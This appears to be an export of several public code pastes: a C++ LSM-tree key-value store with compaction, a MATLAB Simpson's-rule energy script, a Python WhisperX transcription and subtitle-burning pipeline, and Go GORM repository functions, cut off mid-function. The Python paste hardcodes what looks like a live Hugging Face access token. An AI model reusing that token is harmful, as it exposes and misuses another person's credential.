    LSMTree() {
        ensureDbDir();
        loadLevels();
    }

    void put(const std::string& key, const std::string& value) {
        uint64_t timestamp = std::chrono::system_clock::now().time_since_epoch().count();
        std::ofstream wal(WAL_FILENAME, std::ios::app);
        wal << ""{@"" << key << "" "" << value << ""}\n"";
        wal.close();
    
        if (fs::file_size(WAL_FILENAME) >= WAL_SIZE_THRESHOLD) {
            flushWalToL0();
        }
    }

    void flushWalToL0() {
        auto wal_entries = readWalFile(WAL_FILENAME);
        std::map<std::string, SSTEntry> latest_entries;
        
        for (const auto& wal_entry : wal_entries) {
            if (latest_entries.find(wal_entry.key) == latest_entries.end()) {
                SSTEntry entry;
                entry.key = wal_entry.key;
                latest_entries[wal_entry.key] = entry;
            }
            for (const auto& [field, fv] : wal_entry.fields) {
                latest_entries[wal_entry.key].fields[field] = fv;
            }
        }
    
        std::vector<SSTEntry> entries;
        for (auto& [key, entry] : latest_entries) {
            entries.push_back(std::move(entry));
        }
    
        std::string sst_path = DB_DIR + ""/L0/"" +
                              std::to_string(std::chrono::system_clock::now().time_since_epoch().count()) + "".sst"";
        writeSST(sst_path, entries);
    
        std::ofstream wal(WAL_FILENAME, std::ios::trunc);
        loadLevels();
        compactLevel(0);
    }

    std::string get(const std::string& key) {
        std::map<std::string, FieldValue> merged_fields;
    
        // Проверяем WAL
        auto wal_entries = readWalFile(WAL_FILENAME);
        for (const auto& entry : wal_entries) {
            if (entry.key == key) {
                for (const auto& [field, fv] : entry.fields) {
                    if (fv.version > merged_fields[field].version) {
                        merged_fields[field] = fv;
                    }
                }
            }
        }
    
        // Ищем в SST-файлах
        for (const auto& level : levels) {
            for (const auto& sst_path : level) {
                auto entries = readSST(sst_path);
                auto it = std::lower_bound(
                    entries.begin(), entries.end(), key,
                    [](const SSTEntry& e, const std::string& k) { return e.key < k; });
    
                if (it != entries.end() && it->key == key) {
                    for (const auto& [field, fv] : it->fields) {
                        if (fv.version > merged_fields[field].version) {
                            merged_fields[field] = fv;
                        }
                    }
                }
            }
        }
        
        return merged_fields.empty() ? """" : serializeFields(merged_fields);
    }
};

int main() {
    LSMTree db;
    
    // Тестирование версионирования
    // db.put(""b0b-1"", ""{name:\""Alena\"" age:25}"");
    // std::this_thread::sleep_for(std::chrono::milliseconds(10));
    // db.put(""b0b-1"", ""{name:\""Dima\"" age:26 address:\""Moscow\""}"");
    // std::this_thread::sleep_for(std::chrono::milliseconds(10));
    // db.put(""b0b-1"", ""{address@2:\""SPb\""}"");

    // for (size_t i = 0; i < 1; i++) {
    //     db.put(""b0b-5"", ""{name:\""Dima\""}"");
    //     db.put(""b0b-6"", ""{name:\""Dima\""}"");
    //     db.put(""b0b-7"", ""{name:\""Dima\""}"");
    //     db.put(""b0b-8"", ""{name:\""Dima\""}"");
    //     db.put(""b0b-9"", ""{name:\""Dima\""}"");
    //     db.put(""b0b-10"", ""{name:\""Dima\""}"");
    //     db.put(""b0b-11"", ""{name:\""Dima\""}"");
    //     db.put(""b0b-12"", ""{name:\""Dima\""}"");
    //     db.put(""b0b-13"", ""{name:\""Dima\""}"");
    // }
    
    // db.flushWalToL0();
    
    std::cout << ""b0b-1: "" << db.get(""b0b-1"") << std::endl;
    // Вывод: {address@2:SPb age:26 name:Alena}
    std::cout << ""b0b-4: "" << db.get(""b0b-4"") << std::endl;
    
    return 0;
}"
fHgFktUM,MATLAB Script to calculate the Energy in Capacitor and Resistor via Simpsons Rule,Cai_B,C,Thursday 27th of March 2025 09:15:58 AM CDT,"clc;
clear all;
close all;

data = tdfread('Q2_Clean_03.txt'); % Takes in the data from Q2

Intervals = [11, 101, 1001, 10001]; % Different number of intervals 

% Energy stored in capacitor over 60ms calculated via simpsons rule
fprintf('Energy stored in capacitor over 60ms calculated via simpsons rule\n');
for i = 1:length(Intervals)
    N = Intervals(i);
    data.timei = linspace(min(data.time), max(data.time), N);

    data.Presi = interp1(data.time, data.Pres, data.timei);
    data.Pcapi = interp1(data.time, data.Pcap, data.timei);

    a = min(data.time);
    b = max(data.time);
    n = N - 1;
    dx = (b - a)/n;

    % Simpsons rule for Capacitor
    first = data.Pcapi(1);
    last = data.Pcapi(end);
    Pcapi_middle = data.Pcapi(2:end-1);
    odd_terms = Pcapi_middle(1:2:end);
    even_terms = Pcapi_middle(2:2:end);

    % Simpsons rule for Resistor
    first_R = data.Presi(1);
    last_R = data.Presi(end);
    Presi_middle = data.Presi(2:end-1);
    odd_terms_R = Presi_middle(1:2:end);
    even_terms_R = Presi_middle(2:2:end);

    CapacitorEnergy = dx/3 * (first + last + 4*sum(odd_terms) + 2*sum(even_terms));
    Resistor_Energy = dx/3 * (first_R + last_R + 4*sum(odd_terms_R) + 2*sum(even_terms_R));

    fprintf('N = %d, E_capacitor = %.6f J\n', N, CapacitorEnergy);
   

    fprintf('N = %d, E_Resistor = %.6f J\n', N, Resistor_Energy);
    
end

% Time is 10ms
TimeLimit = data.time <= 0.01;
Limit_time = data.time(TimeLimit);
Limit_Pcap = data.Pcap(TimeLimit);
Limit_Pres = data.Pres(TimeLimit);

fprintf('Energy stored in capacitor over 10ms calculated via simpsons rule\n');
for i = 1:length(Intervals)
    N = Intervals(i);
    timei = linspace(min(Limit_time), max(Limit_time), N);
    Pcapi = interp1(Limit_time, Limit_Pcap, timei);
    Presi = interp1(Limit_time, Limit_Pres, timei);

    a = min(Limit_time);
    b = max(Limit_time);
    n = N - 1;
    dx = (b - a)/n;

    first = Pcapi(1);
    last = Pcapi(end);
    Pcapi_middle = Pcapi(2:end-1);
    odd_terms = Pcapi_middle(1:2:end);
    even_terms = Pcapi_middle(2:2:end);

    first_R = Presi(1);
    last_R = Presi(end);
    Presi_middle = Presi(2:end-1);
    odd_terms_R = Presi_middle(1:2:end);
    even_terms_R = Presi_middle(2:2:end);

    E_capi_Simp = dx/3 * (first + last + 4*sum(odd_terms) + 2*sum(even_terms));
    Resistor_Energy10 = dx/3 * (first_R + last_R + 4*sum(odd_terms_R) + 2*sum(even_terms_R));

    fprintf('N = %d, E_capacitor = %.6f J\n', N, E_capi_Simp);
   

    fprintf('N = %d, E_Resistor = %.6f J\n', N, Resistor_Energy10);

end"
fCyyk8rz,Redka Compact Init ver 4.0,scottish_esquire,C++,Thursday 27th of March 2025 09:15:50 AM CDT,"#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <map>
#include <filesystem>
#include <chrono>
#include <algorithm>
#include <cmath>
#include <sstream>
#include <regex>

namespace fs = std::filesystem;

const std::string DB_DIR = ""lsm_db"";
const size_t LEVEL_BASE_SIZE = 10;

#pragma pack(push, 1)
struct SSTHeader {
    uint32_t version = 2;
    uint32_t entry_count;
    uint64_t index_offset;
};

struct SSTIndexEntry {
    uint32_t key_length;
    uint64_t data_offset;
    uint32_t data_length;
};
#pragma pack(pop)

struct FieldValue {
    uint32_t version;
    std::string value;
};

struct SSTEntry {
    std::string key;
    std::map<std::string, FieldValue> fields;

    bool operator<(const SSTEntry& other) const {
        return key < other.key;
    }
};

class LSMTree {
private:
    std::vector<std::vector<std::string>> levels;

    void ensureDbDir() {
        if (!fs::exists(DB_DIR)) {
            fs::create_directory(DB_DIR);
            for (int i = 0; i < 10; ++i) {
                fs::create_directory(DB_DIR + ""/L"" + std::to_string(i));
            }
        }
    }

    void loadLevels() {
        levels.clear();
        for (int i = 0; ; ++i) {
            std::string level_dir = DB_DIR + ""/L"" + std::to_string(i);
            if (!fs::exists(level_dir)) break;

            std::vector<std::string> files;
            for (const auto& entry : fs::directory_iterator(level_dir)) {
                if (entry.path().extension() == "".sst"") {
                    files.push_back(entry.path().string());
                }
            }
            std::sort(files.begin(), files.end());
            std::reverse(files.begin(), files.end());
            levels.push_back(files);
        }
    }

    void mergeEntries(SSTEntry& target, const SSTEntry& source) {
        for (const auto& [field, src_val] : source.fields) {
            auto it = target.fields.find(field);
            if (it == target.fields.end() || src_val.version > it->second.version) {
                target.fields[field] = src_val;
            }
        }
    }

    std::vector<SSTEntry> readSST(const std::string& path) {
        std::ifstream file(path, std::ios::binary);
        if (!file) return {};

        SSTHeader header;
        file.read(reinterpret_cast<char*>(&header), sizeof(header));

        std::vector<SSTIndexEntry> index(header.entry_count);
        file.seekg(header.index_offset);
        file.read(reinterpret_cast<char*>(index.data()), header.entry_count * sizeof(SSTIndexEntry));

        std::vector<SSTEntry> entries;
        for (const auto& idx : index) {
            file.seekg(idx.data_offset);
            
            uint32_t total_len;
            file.read(reinterpret_cast<char*>(&total_len), sizeof(total_len));

            std::string key(idx.key_length, '\0');
            file.read(&key[0], idx.key_length);

            std::string fields_data(total_len - idx.key_length, '\0');
            file.read(&fields_data[0], fields_data.size());

            SSTEntry entry;
            entry.key = key;
            entry.fields = parseFields(fields_data);
            entries.push_back(entry);
        }

        return entries;
    }

    std::map<std::string, FieldValue> parseFields(const std::string& data) {
        std::map<std::string, FieldValue> fields;
        std::regex field_re(R""((\w+)(@(\d+))?:([^ ]+))"");
        std::smatch match;
        std::string::const_iterator search_start(data.cbegin());

        while (std::regex_search(search_start, data.cend(), match, field_re)) {
            std::string field = match[1].str();
            uint32_t version = match[3].matched ? std::stoul(match[3].str()) : 1;
            std::string value = match[4].str();

            fields[field] = {version, value};
            search_start = match[0].second;
        }

        return fields;
    }

    std::string serializeFields(const std::map<std::string, FieldValue>& fields) {
        std::stringstream ss;
        ss << ""{"";
        bool first = true;
        for (const auto& [field, fv] : fields) {
            if (!first) ss << "" "";
            first = false;
            if (fv.version > 1) {
                ss << field << ""@"" << fv.version << "":"" << fv.value;
            } else {
                ss << field << "":"" << fv.value;
            }
        }
        ss << ""}"";
        return ss.str();
    }

    void writeSST(const std::string& path, const std::vector<SSTEntry>& entries) {
        std::ofstream file(path, std::ios::binary);
        SSTHeader header;
        header.entry_count = entries.size();
        file.write(reinterpret_cast<char*>(&header), sizeof(header));

        std::vector<SSTIndexEntry> index;
        for (const auto& entry : entries) {
            SSTIndexEntry idx;
            idx.key_length = entry.key.size();
            idx.data_offset = file.tellp();

            std::string fields_data = serializeFields(entry.fields);
            uint32_t total_len = entry.key.size() + fields_data.size();
            
            file.write(reinterpret_cast<char*>(&total_len), sizeof(total_len));
            file.write(entry.key.data(), entry.key.size());
            file.write(fields_data.data(), fields_data.size());

            idx.data_length = total_len;
            index.push_back(idx);
        }

        header.index_offset = file.tellp();
        for (const auto& idx : index) {
            file.write(reinterpret_cast<const char*>(&idx), sizeof(idx));
        }

        file.seekp(0);
        file.write(reinterpret_cast<char*>(&header), sizeof(header));
    }

public:
    LSMTree() {
        ensureDbDir();
        loadLevels();
    }

    void compactLevel(int level) {
        if (level >= levels.size()) return;
        
        std::map<std::string, SSTEntry> merged_entries;
        
        // Собираем и мержим все записи с текущего уровня
        for (const auto& sst_path : levels[level]) {
            auto entries = readSST(sst_path);
            for (const auto& entry : entries) {
                if (merged_entries.find(entry.key) == merged_entries.end()) {
                    merged_entries[entry.key] = entry;
                } else {
                    mergeEntries(merged_entries[entry.key], entry);
                }
            }
        }
    
        if (merged_entries.size() >= LEVEL_BASE_SIZE * std::pow(10, level)) {
            // Преобразуем map в vector для записи
            std::vector<SSTEntry> entries_to_write;
            for (auto& [key, entry] : merged_entries) {
                entries_to_write.push_back(std::move(entry));
            }
            std::sort(entries_to_write.begin(), entries_to_write.end());
    
            // Записываем на следующий уровень
            std::string new_sst = DB_DIR + ""/L"" + std::to_string(level + 1) + ""/"" +
                                 std::to_string(std::chrono::system_clock::now().time_since_epoch().count()) + "".sst"";
            writeSST(new_sst, entries_to_write);
    
            // Удаляем старые файлы
            for (const auto& sst_path : levels[level]) {
                fs::remove(sst_path);
            }
    
            // Обновляем индексы и рекурсивно уплотняем
            loadLevels();
            compactLevel(level + 1);
        }
    }
};

int main() {
    LSMTree db;
    
    // Запуск компактизации всех уровней, начиная с 0
    db.compactLevel(0);
    
    return 0;
}"
hQ5B1DfF,VideoToText,PyK0T1K,Python,Thursday 27th of March 2025 09:11:06 AM CDT,"import os
import subprocess
import glob
import whisperx
from tqdm import tqdm


def has_subtitles(video_path):
    try:
        result = subprocess.check_output([
            'ffprobe', '-v', 'error', '-select_streams', 's',
            '-show_entries', 'stream=index', '-of', 'csv=p=0', video_path
        ])
        return bool(result.strip())
    except:
        return False


def extract_audio(video_path, audio_path):
    subprocess.run([
        'ffmpeg', '-y', '-i', video_path, '-vn',
        '-acodec', 'pcm_s16le', '-ar', '44100', '-ac', '2', audio_path
    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)


def format_time(seconds):
    millisec = int((seconds - int(seconds)) * 1000)
    return f""{int(seconds // 3600):02}:{int((seconds % 3600) // 60):02}:{int(seconds % 60):02},{millisec:03}""


def convert_language_code(lang):
    mapping = {
        ""ru"": ""rus"",
        ""en"": ""eng"",
    }
    return mapping.get(lang.lower()) if lang else None


def transcribe_audio(audio_path):
    device = ""cuda""
    batch_size = 16
    compute_type = ""float16""
    model = whisperx.load_model(""large-v3"", device, compute_type=compute_type)
    audio = whisperx.load_audio(audio_path)
    result = model.transcribe(audio, batch_size=batch_size)

    original_language = result[""language""]
    metadata_language = convert_language_code(original_language)

    if metadata_language is None:
        print(f""Язык {original_language} не поддерживается. Пропуск файла."")
        return None, None, None

    try:
        model_a, metadata = whisperx.load_align_model(language_code=original_language, device=device)
    except ValueError:
        print(f""Нет модели выравнивания для языка: {original_language}. Использование без выравнивания."")
        model_a, metadata = None, None

    result = whisperx.align(result[""segments""], model_a, metadata, audio, device,
                            return_char_alignments=False) if model_a else result

    diarize_model = whisperx.DiarizationPipeline(
        use_auth_token=""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"", device=device
    )
    diarize_segments = diarize_model(audio)
    result = whisperx.assign_word_speakers(diarize_segments, result)

    srt_lines = []
    text_lines = []
    index = 1

    for segment in result[""segments""]:
        speaker = segment.get(""speaker"", ""Unknown"")
        start_time = format_time(segment['start'])
        end_time = format_time(segment['end'])
        words = "" "".join([word[""word""] for word in segment[""words""]])
        srt_lines.append(f""{index}"")
        srt_lines.append(f""{start_time} --> {end_time}"")
        srt_lines.append(f""{speaker}: {words}"")
        srt_lines.append("""")
        text_lines.append(f""`{start_time}-{end_time}` **{speaker}**: {words}"")
        index += 1

    return ""\n"".join(srt_lines), ""\n"".join(text_lines), metadata_language


def process_pipeline(video_path, output_base):
    base_name = os.path.splitext(os.path.basename(video_path))[0]

    temp_dir = os.path.join(os.getcwd(), ""temp"")
    os.makedirs(temp_dir, exist_ok=True)

    output_dir = os.path.join(output_base, ""outputs"")
    os.makedirs(output_dir, exist_ok=True)

    temp_audio = os.path.join(temp_dir, f""{base_name}.wav"")
    extract_audio(video_path, temp_audio)

    if not os.path.exists(temp_audio):
        print(f""Ошибка: аудиофайл {temp_audio} не был создан. Пропуск файла."")
        return

    srt_content, text_content, lang = transcribe_audio(temp_audio)

    if srt_content is None:
        print(f""Пропущено {video_path} из-за неподдерживаемого языка."")
        if os.path.exists(temp_audio):
            os.remove(temp_audio)
        return

    output_srt = os.path.join(output_dir, f""{base_name}.srt"")
    with open(output_srt, ""w"", encoding=""utf-8"") as f:
        f.write(srt_content)

    output_text = os.path.join(output_dir, f""{base_name}.txt"")
    with open(output_text, ""w"", encoding=""utf-8"") as f:
        f.write(text_content)

    output_video = os.path.join(output_dir, f""{base_name}.mp4"")
    burn_subtitles(video_path, output_srt, output_video, lang)

    if os.path.exists(temp_audio):
        os.remove(temp_audio)

    # if os.path.exists(output_srt):  # удаление .srt
    #     os.remove(output_srt)

    print(f""Обработано: {video_path} (Язык: {lang})"")


def burn_subtitles(video_path, srt_path, output_video_path, language):
    srt_path_filter = srt_path.replace(""\\"", ""/"")
    command = [
        'ffmpeg', '-y',
        '-i', video_path,
        '-i', srt_path_filter,
        '-c:v', 'hevc_nvenc', '-cq', '37',
        '-c:a', 'copy',
        '-c:s', 'mov_text'
    ]

    mapped_language = convert_language_code(language)
    if mapped_language:
        command.extend(['-metadata:s:s:0', f'language={mapped_language}'])

    command.append(output_video_path)

    subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)


def process_folder(folder_path, output_base):
    video_extensions = [""*.mp4"", ""*.mkv"", ""*.avi"", ""*.mov"", ""*.webm""]
    video_files = []

    for ext in tqdm(video_extensions, desc=""Поиск видеофайлов""):
        video_files.extend(glob.glob(os.path.join(folder_path, ext)))

    output_dir = os.path.join(output_base, ""outputs"")
    os.makedirs(output_dir, exist_ok=True)

    files_to_process = []
    for video in tqdm(video_files, desc=""Проверка наличия субтитров и выходных файлов""):
        base_name = os.path.splitext(os.path.basename(video))[0]
        output_video_path = os.path.join(output_dir, f""{base_name}.mp4"")

        if os.path.exists(output_video_path):
            # print(f""\nПропущено: {video} (уже обработано)\n"")
            continue

        if not has_subtitles(video):
            files_to_process.append(video)

    for video in tqdm(files_to_process, desc=""Обработка видеофайлов""):
        process_pipeline(video, output_base)


if __name__ == ""__main__"":
    INPUT_FOLDER = r""C:\Users\User\Videos""
    OUTPUT_BASE = r""C:\Users\User\Videos""
    process_folder(INPUT_FOLDER, OUTPUT_BASE)
"
c172dyJt,document rep,bruimafia,Go,Thursday 27th of March 2025 08:59:33 AM CDT,"package repositories

import (
	""document-flow-server/internal/apperrors""
	""document-flow-server/internal/database""
	""document-flow-server/internal/models""
	""document-flow-server/internal/repositories/scopes""
	""fmt""
	""strings""

	""gorm.io/gorm""
)

// GetAllDocuments получает список документов с пагинацией
func GetAllDocuments(page, limit int) (models.DocumentsResponse, error) {
	var documents []models.Document
	var totalCount int64

	offset := (page - 1) * limit

	err := database.OpenReadTransaction(func(tx *gorm.DB) error {
		if err := tx.Model(&models.Document{}).Count(&totalCount).Error; err != nil {
			return fmt.Errorf(""не удалось получить количество документов: %w"", err)
		}

		if err := tx.Scopes(scopes.PreloadCreator).
			Preload(""Template"", func(db *gorm.DB) *gorm.DB {
				return db.Unscoped()
			}).
			Order(""updated_at DESC"").
			Limit(limit).
			Offset(offset).
			Find(&documents).Error; err != nil {
			return fmt.Errorf(""не удалось загрузить документы: %w"", err)
		}

		for i := range documents {
			documents[i].Creator.DepartmentUserToDepartmentWithTitle()
		}

		return nil
	})

	if err != nil {
		return models.DocumentsResponse{}, err
	}

	return models.DocumentsResponse{
		Documents:  documents,
		TotalCount: totalCount,
		Page:       page,
		Limit:      limit,
	}, nil
}

// GetUserDocuments получает список документов с пагинацией конкретного пользователя
func GetUserDocuments(page, limit int, userID uint64) (models.DocumentsResponse, error) {
	var documents []models.Document
	var totalCount int64

	offset := (page - 1) * limit

	err := database.OpenReadTransaction(func(tx *gorm.DB) error {
		if err := tx.Model(&models.Document{}).
			Where(""creator_id = ?"", userID).
			Count(&totalCount).Error; err != nil {
			return fmt.Errorf(""не удалось получить количество документов: %w"", err)
		}

		if err := tx.Scopes(scopes.PreloadCreator).
			Preload(""Template"", func(db *gorm.DB) *gorm.DB {
				return db.Unscoped()
			}).
			Where(""creator_id = ?"", userID).
			Order(""updated_at DESC"").
			Limit(limit).
			Offset(offset).
			Find(&documents).Error; err != nil {
			return fmt.Errorf(""не удалось загрузить документы: %w"", err)
		}

		for i := range documents {
			documents[i].Creator.DepartmentUserToDepartmentWithTitle()
		}

		return nil
	})

	if err != nil {
		return models.DocumentsResponse{}, err
	}

	return models.DocumentsResponse{
		Documents:  documents,
		TotalCount: totalCount,
		Page:       page,
		Limit:      limit,
	}, nil
}

// CreateDocument создаёт новый документ и возвращает его с предзагруженными данными
func CreateDocument(document *models.Document) (*models.Document, error) {
	err := database.OpenWriteTransaction(func(tx *gorm.DB) error {
		if err := tx.Create(&document).Error; err != nil {
			return apperrors.ErrDocumentCreationFailed
		}

		if err := tx.Scopes(scopes.PreloadCreator).Preload(""Template"").First(document, document.ID).Error; err != nil {
			return fmt.Errorf(""не удалось загрузить созданный документ: %w"", err)
		}

		document.Creator.DepartmentUserToDepartmentWithTitle()

		return nil
	})

	if err != nil {
		return nil, err
	}

	return document, nil
}

// GetDocumentById получает документ по его идентификатору
func GetDocumentById(id uint64) (*models.Document, error) {
	var document models.Document

	err := database.OpenReadTransaction(func(tx *gorm.DB) error {
		if err := tx.Scopes(scopes.PreloadCreator).
			Preload(""Template"", func(db *gorm.DB) *gorm.DB {
				return db.Unscoped()
			}).
			Where(""id = ?"", id).
			First(&document).Error; err != nil {
			if err == gorm.ErrRecordNotFound {
				return apperrors.ErrDocumentNotFound
			}
			return fmt.Errorf(""не удалось загрузить документ: %w"", err)
		}

		document.Creator.DepartmentUserToDepartmentWithTitle()

		return nil
	})

	if err != nil {
		return nil, err
	}

	return &document, nil
}

// UpdateDocumentById обновляет документ по его идентификатору
func UpdateDocumentById(id uint64, updateDocument *models.Document) (*models.Document, error) {
	document, err := GetDocumentById(id)
	if err != nil {
		return nil, err
	}
	updateDocument.ID = document.ID

	err = database.OpenWriteTransaction(func(tx *gorm.DB) error {
		if err := tx.Where(""id = ?"", id).Updates(updateDocument).Error; err != nil {
			return apperrors.ErrDocumentUpdateFailed
		}
		return nil
	})

	if err != nil {
		return nil, err
	}

	return updateDocument, nil
}

// DeleteDocumentById удаляет документ по его идентификатору
func DeleteDocumentById(id uint64) error {
	document, err := GetDocumentById(id)
	if err != nil {
		return err
	}

	return database.OpenWriteTransaction(func(tx *gorm.DB) error {

		if err := tx.Delete(document).Error; err != nil {
			return apperrors.ErrDocumentDeleteFailed
		}

		var countSemaTemplateDocument int64
		tx.Model(&models.Document{}).Where(""template_id = ?"", document.Template.ID).Count(&countSemaTemplateDocument)

		return nil
	})
}

// SearchDocuments выполняет универсальный поиск по заданному запросу по выбранным полям
func SearchDocuments(query string, page, limit int) (models.DocumentsResponse, error) {
	var documents []models.Document
	var totalCount int64
	var values []interface{}
	var sb strings.Builder

	offset := (page - 1) * limit

	// поля, в которых ищем информацию
	allowedFields := []string{""name"", ""substitutions""}

	if query != """" {
		for i, column := range allowedFields {
			if i > 0 {
				sb.WriteString("" OR "")
			}
			if column == ""substitutions"" {
				// для поля markers используем jsonb операции для поиска внутри JSON
				sb.WriteString(""substitutions::text ILIKE ?"")
				values = append(values, ""%""+query+""%"")
			} else {
				sb.WriteString(column + "" ILIKE ?"")
				values = append(values, ""%""+query+""%"")
			}
		}
	}

	querySQL := sb.String()

	err := database.OpenReadTransaction(func(tx *gorm.DB) error {
		txWithFilters := tx.Model(&models.Document{})
		if querySQL != """" {
			txWithFilters = txWithFilters.Where(querySQL, values...)
		}

		if err := txWithFilters.Count(&totalCount).Error; err != nil {
			return fmt.Errorf(""ошибка подсчёта записей: %w"", err)
		}

		txWithFilters = txWithFilters.Scopes(scopes.PreloadCreator).
			Preload(""Template"", func(db *gorm.DB) *gorm.DB {
				return db.Unscoped()
			}).
			Order(""updated_at DESC"").
			Limit(limit).
			Offset(offset)
		if err := txWithFilters.Find(&documents).Error; err != nil {
			return fmt.Errorf(""ошибка загрузки данных: %w"", err)
		}

		for i := range documents {
			documents[i].Creator.DepartmentUserToDepartmentWithTitle()
		}

		return nil
	})

	if err != nil {
		return models.DocumentsResponse{}, err
	}

	return models.DocumentsResponse{
		Documents:  documents,
		TotalCount: totalCount,
		Page:       page,
		Limit:      limit,
	}, nil
}

func SearchUserDocuments(query string, page, limit int, userID uint64) (models.DocumentsResponse, error) {
	var documents []models.Document
	var totalCount int64
	var values []interface{}
	var sb strings.Builder

	offset := (page - 1) * limit

	// поля, в которых ищем информацию
	allowedFields := []string{""name"", ""substitutions""}

	if query != """" {
		for i, column := range allowedFields {
			if i > 0 {
				sb.WriteString("" OR "")
			}
			if column == ""substitutions"" {
				// для поля markers используем jsonb операции для поиска внутри JSON
				sb.WriteString(""substitutions::text ILIKE ?"")
				values = append(values, ""%""+query+""%"")
			} else {
				sb.WriteString(column + "" ILIKE ?"")
				values = append(values, ""%""+query+""%"")
			}
		}
	}

	querySQL := sb.String()

	err := database.OpenReadTransaction(func(tx *gorm.DB) error {
		txWithFilters := tx.Model(&models.Document{}).Where(""creator_id = ?"", userID)
		if querySQL != """" {
			txWithFilters = txWithFilters.Where(querySQL, values...)
		}

		if err := txWithFilters.Count(&totalCount).Error; err != nil {
			return fmt.Errorf(""ошибка подсчёта записей: %w"", err)
		}

		txWithFilters = txWithFilters.Scopes(scopes.PreloadCreator).
			Preload(""Template"", func(db *gorm.DB) *gorm.DB {
				return db.Unscoped()
			}).
			Order(""updated_at DESC"").
			Limit(limit).
			Offset(offset)
		if err := txWithFilters.Find(&documents).Error; err != nil {
			return fmt.Errorf(""ошибка загрузки данных: %w"", err)
		}

		for i := range documents {
			documents[i].Creator.DepartmentUserToDepartmentWithTitle()
		}

		return nil
	})

	if err != nil {
		return models.DocumentsResponse{}, err
	}

	return models.DocumentsResponse{
		Documents:  documents,
		TotalCount: totalCount,
		Page:       page,
		Limit:      limit,
	}, nil
}

// DocumentExistsByName проверяет, существует ли документ с таким именем у того же пользователя
func DocumentExistsByName(name string, creatorID uint64) (bool, error) {
	var count int64

	err := database.OpenReadTransaction(func(tx *gorm.DB) error {
		if err := tx.Model(&models.Document{}).
			Where(""name = ? AND creator_id = ?"", name, creatorID).
			Count(&count).Error; err != nil {
			return fmt.Errorf(""ошибка при проверке существования документа: %w"", err)
		}
		return nil
	})

	if err != nil {
		return false, err
	}

	return count > 0, nil
}
"
78u1j5XH,template rep,bruimafia,Go,Thursday 27th of March 2025 08:59:15 AM CDT,"package repositories

import (
	""document-flow-server/internal/apperrors""
	""document-flow-server/internal/database""
	""document-flow-server/internal/models""
	""document-flow-server/internal/repositories/scopes""
	""fmt""
	""strings""

	""gorm.io/gorm""
)

// GetAllTemplates получает список всех шаблонов
func GetAllTemplates() (models.TemplatesResponse, error) {
	var templates []models.Template
	var totalCount int64

	err := database.OpenReadTransaction(func(tx *gorm.DB) error {
		if err := tx.Model(&models.Template{}).Count(&totalCount).Error; err != nil {
			return fmt.Errorf(""не удалось получить количество шаблонов: %w"", err)
		}

		if err := tx.Scopes(scopes.PreloadCreator).
			Order(""updated_at DESC"").
			Find(&templates).Error; err != nil {
			return fmt.Errorf(""не удалось загрузить шаблоны: %w"", err)
		}

		for i := range templates {
			templates[i].Creator.DepartmentUserToDepartmentWithTitle()
		}

		return nil
	})

	if err != nil {
		return models.TemplatesResponse{}, err
	}

	return models.TemplatesResponse{
		Templates:  templates,
		TotalCount: totalCount,
		Page:       1,
		Limit:      int(totalCount),
	}, nil
}

// GetTemplatesPaginated получает список шаблонов с пагинацией
func GetTemplatesPaginated(page, limit int) (models.TemplatesResponse, error) {
	var templates []models.Template
	var totalCount int64

	offset := (page - 1) * limit

	err := database.OpenReadTransaction(func(tx *gorm.DB) error {
		if err := tx.Model(&models.Template{}).Count(&totalCount).Error; err != nil {
			return fmt.Errorf(""не удалось получить количество шаблонов: %w"", err)
		}

		if err := tx.Scopes(scopes.PreloadCreator).
			Order(""updated_at DESC"").
			Limit(limit).
			Offset(offset).
			Find(&templates).Error; err != nil {
			return fmt.Errorf(""не удалось загрузить шаблоны: %w"", err)
		}

		for i := range templates {
			templates[i].Creator.DepartmentUserToDepartmentWithTitle()
		}

		return nil
	})

	if err != nil {
		return models.TemplatesResponse{}, err
	}

	return models.TemplatesResponse{
		Templates:  templates,
		TotalCount: totalCount,
		Page:       page,
		Limit:      limit,
	}, nil
}

// CreateTemplate создаёт новый шаблон и возвращает его с предзагруженными данными
func CreateTemplate(template *models.Template) (*models.Template, error) {
	err := database.OpenWriteTransaction(func(tx *gorm.DB) error {
		if err := tx.Create(&template).Error; err != nil {
			return apperrors.ErrTemplateCreationFailed
		}

		if err := tx.Scopes(scopes.PreloadCreator).First(template, template.ID).Error; err != nil {
			return fmt.Errorf(""не удалось загрузить созданный шаблон: %w"", err)
		}

		template.Creator.DepartmentUserToDepartmentWithTitle()

		return nil
	})

	if err != nil {
		return nil, err
	}

	return template, nil
}

// GetTemplateById получает шаблон по его идентификатору
func GetTemplateById(id uint64) (*models.Template, error) {
	var template models.Template

	err := database.OpenReadTransaction(func(tx *gorm.DB) error {
		if err := tx.Scopes(scopes.PreloadCreator).Unscoped().Where(""id = ?"", id).First(&template).Error; err != nil {
			if err == gorm.ErrRecordNotFound {
				return apperrors.ErrTemplateNotFound
			}
			return fmt.Errorf(""не удалось загрузить шаблон: %w"", err)
		}

		template.Creator.DepartmentUserToDepartmentWithTitle()

		return nil
	})

	if err != nil {
		return nil, err
	}

	return &template, nil
}

// UpdateTemplateById обновляет шаблон по его идентификатору
func UpdateTemplateById(id uint64, updates map[string]interface{}) (*models.Template, error) {
	var template models.Template

	// преобразование markers к StringArray
	if markers, ok := updates[""markers""].([]interface{}); ok {
		var strArr models.StringArray
		for _, m := range markers {
			if s, ok := m.(string); ok {
				strArr = append(strArr, s)
			}
		}
		updates[""markers""] = strArr
	}

	err := database.OpenWriteTransaction(func(tx *gorm.DB) error {
		result := tx.Model(&models.Template{}).Where(""id = ?"", id).Updates(updates)
		if result.Error != nil {
			return result.Error
		}
		if result.RowsAffected == 0 {
			return apperrors.ErrTemplateNotFound
		}

		if err := tx.Scopes(scopes.PreloadCreator).First(&template, id).Error; err != nil {
			return err
		}

		template.Creator.DepartmentUserToDepartmentWithTitle()
		return nil
	})

	return &template, err
}

// DeleteTemplateById удаляет шаблон по его идентификатору
func DeleteTemplateById(id uint64) error {
	template, err := GetTemplateById(id)
	if err != nil {
		return err
	}

	return database.OpenWriteTransaction(func(tx *gorm.DB) error {
		if err := tx.Delete(template).Error; err != nil {
			return apperrors.ErrTemplateDeleteFailed
		}
		return nil
	})
}

// SearchTemplates выполняет универсальный поиск по заданному запросу по выбранным полям
func SearchTemplates(query string, page, limit int) (models.TemplatesResponse, error) {
	var templates []models.Template
	var totalCount int64
	var values []interface{}
	var sb strings.Builder

	offset := (page - 1) * limit

	// поля, в которых ищем информацию
	allowedFields := []string{""name"", ""description"", ""markers""}

